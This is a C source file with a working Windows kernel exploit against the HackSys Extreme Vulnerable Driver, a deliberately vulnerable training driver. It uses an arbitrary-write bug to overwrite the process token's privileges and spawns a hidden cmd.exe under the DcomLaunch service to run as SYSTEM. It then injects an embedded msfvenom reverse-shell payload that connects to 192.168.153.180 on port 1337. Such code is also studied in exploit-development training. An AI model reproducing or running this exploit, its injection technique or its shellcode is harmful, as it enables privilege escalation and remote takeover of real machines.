#include "Common.h"
#include "Exploits.h"
#include <winternl.h>
/*
   HEVD HevdArbitraryWriteMI / Medium Integrity

   Author: @xct_de
   Target: 10.0.19044

   We exploit this arbitrary write by overwriting the token privileges of our process. Although token stealing would be a lot 
   easier we do it this way to play with the technique. With the new privileges we can open a handle to a service and
   spawn a process wich we reparent to this system service (by doing so it becomes elevated). We then inject into
   this new process and run shellcode. Injecting is not really required as you can run any executeable and reparent it.

   References:
   - Arbitrary Increment Exploitation (https://windows-internals.com/exploiting-a-simple-vulnerability-in-35-easy-steps-or-less/#7-what-do-we-increment)
   - SeDebugPrivilege Exploitation https://windows-internals.com/faxing-your-way-to-system/ 
     * SeDebugPrivilege allows to open a handle to any process on the system (including any service)
	 * We reparent to a SYSTEM process (DcomLauncher) which makes it run as SYSTEM and is a bit less sus
	 * Inject into the child process to get a rev shell (we could also run an attacker provided binary)
   */


int HevdArbitraryWriteMI(int argc, char** argv) {
	printf("~----------------------------~\n");
	printf("  Running HevdArbitraryWrite  \n");
	printf("~----------------------------~\n");

	typedef struct _WriteWhatWhereBuffer
	{
		uintptr_t what;
		uintptr_t where;
	} WriteWhatWhereBuffer;

	// msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.153.180 LPORT=1337 -f csharp
	BYTE sc[460] = {
		0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
		0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
		0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
		0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
		0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
		0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
		0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
		0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
		0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
		0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
		0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
		0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
		0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
		0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
		0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,
		0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x05,0x39,0xc0,0xa8,0x99,0xb4,0x41,0x54,
		0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,
		0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
		0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,
		0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,
		0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,
		0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,
		0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,
		0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,
		0x24,0x54,0x01,0x01,0x48,0x8d,0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,
		0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,
		0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,
		0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,0xba,0x08,0x87,0x1d,0x60,0xff,
		0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
		0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
		0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 
	};


	HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
		exit(1);
	}

	// get base address of kernel & driver (only works from medium integrity)
	ULONGLONG ntBase = getBaseAddr(L"ntoskrnl.exe");
	printf("[>] Nt base: %p\n", ntBase);

	// DCom Injection Technique (thanks to yarden shafir & alex ionescu)
	HANDLE processTokenHandle;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &processTokenHandle)) {
		printf("[-] OpenProcessToken failed\n");
	}

	PVOID tokenAddress;
	GetProcessTokenAddress(processTokenHandle, &tokenAddress);
	printf("[>] Process token address: 0x%p\n", tokenAddress);
	CloseHandle(processTokenHandle);

	PVOID  presentPrivilegesAddress = (PVOID)((ULONG64)tokenAddress + offsetof(TOKEN, Privileges.Present) + 2);
	PVOID  enabledPrivilegesAddress = (PVOID)((ULONG64)tokenAddress + offsetof(TOKEN, Privileges.Enabled) + 2);
	printf("[>] Editing addresses: 0x%p, 0x%p\n", presentPrivilegesAddress,	enabledPrivilegesAddress);

	// Start Exploit Arb Write

	_WriteWhatWhereBuffer arbWriteBuf = { 0 };
	QWORD superToken = 0xF00FF;
	/*
	 SeCreatePermanentPrivilege    Create permanent shared objects    Enabled
	 SeBackupPrivilege             Back up files and directories      Enabled
	 SeRestorePrivilege            Restore files and directories      Enabled
	 SeShutdownPrivilege           Shut down the system               Enabled
	 SeDebugPrivilege              Debug programs                     Enabled
	 SeAuditPrivilege              Generate security audits           Enabled
	 SeSystemEnvironmentPrivilege  Modify firmware environment values Enabled
	 SeChangeNotifyPrivilege       Bypass traverse checking           Enabled
	 SeRelabelPrivilege            Modify an object label             Enabled
	 SeIncreaseWorkingSetPrivilege Increase a process working set     Enabled
	 SeTimeZonePrivilege           Change the time zone               Enabled
	 SeCreateSymbolicLinkPrivilege Create symbolic links              Enabled
	*/
	arbWriteBuf.what = (ULONG_PTR)&superToken;
	arbWriteBuf.where = (uintptr_t) presentPrivilegesAddress;
	if (!DeviceIoControl(hDriver, IOCTL(0x802), (LPVOID)&arbWriteBuf, sizeof(arbWriteBuf), NULL, 0, NULL, NULL)) {
		printf("[-] ArbitaryWrite IOCTL failed\n");
		exit(-1);
	}
	printf("[>] Arbitrary write used to modify present token privileges\n");

	arbWriteBuf.what = (ULONG_PTR)&superToken;
	arbWriteBuf.where = (uintptr_t) enabledPrivilegesAddress;
	if (!DeviceIoControl(hDriver, IOCTL(0x802), (LPVOID)&arbWriteBuf, sizeof(arbWriteBuf), NULL, 0, NULL, NULL)) {
		printf("[-] ArbitaryWrite IOCTL failed\n");
		exit(-1);
	}
	printf("[>] Arbitrary write used to modify enabled token privileges\n");
	// End Exploit Arb Write

	//system("cmd.exe"); // this shell would have all privileges enabled but the user is not changed
	printf("[>] Spawning system process & using SeDebugPrivilege to inject..\n");
	
	HANDLE parentHandle;
	if(FAILED(GetServiceHandle(L"DcomLaunch", &parentHandle)))
	{
		printf("[-] Failed to get handle to DcomLaunch service\n");
		exit(-1);
	}
	printf("[>] Received handle to DcomLaunch\n");

	PPROC_THREAD_ATTRIBUTE_LIST procList = NULL;
	SIZE_T listSize;
	InitializeProcThreadAttributeList(NULL, 1, 0, &listSize); // supposed to fail but will result in correct listSize
	procList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, listSize);
	if (procList == NULL)
	{
		printf("[>] Failed to allocate memory\n");
		exit(-1);
	}
	InitializeProcThreadAttributeList(procList, 1, 0, &listSize); // now it works

	if(!UpdateProcThreadAttribute(procList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentHandle,	sizeof(parentHandle), NULL,	NULL)) {
		printf("[>] Failed to update ProcThreadAttribute");
		exit(-1);
	}

	STARTUPINFOEX startupInfoEx;
	PROCESS_INFORMATION processInfo;
	RtlZeroMemory(&startupInfoEx, sizeof(startupInfoEx));
	startupInfoEx.StartupInfo.cb = sizeof(startupInfoEx);
	startupInfoEx.StartupInfo.wShowWindow = SW_HIDE;
	startupInfoEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW |
		STARTF_USESTDHANDLES;
	startupInfoEx.lpAttributeList = procList;
	if(!CreateProcess(L"c:\\windows\\system32\\cmd.exe",
		NULL,
		NULL,
		NULL,
		TRUE,
		CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		&startupInfoEx.StartupInfo,
		&processInfo)
	) {
		printf("[-] CreateProcess failed\n");
		exit(-1);
	}
	printf("[>] Created new process with ID %d\n", processInfo.dwProcessId);

	printf("[>] Allocating memory for shellcode in target process\n");
	LPVOID pAddr = VirtualAllocEx(processInfo.hProcess, nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("[>] Address in target process: %p\n", pAddr);

	printf("[>] Writing process memory & running CreateThread\n");
	SIZE_T bytesWritten = 0;
	if (!WriteProcessMemory(processInfo.hProcess, pAddr, sc, sizeof(sc), &bytesWritten)) {
		printf("[-] Failed to WriteProcessMemory\n");
		exit(-1);
	}
	if (!CreateRemoteThread(processInfo.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pAddr, NULL, 0, NULL)) {
		printf("[-] Failed to WriteProcessMemory\n");
		exit(-1);
	}
	printf("[>] Done, dropping privileges\n");

	CloseHandle(processInfo.hThread);
	CloseHandle(processInfo.hProcess);
	return 0;
}
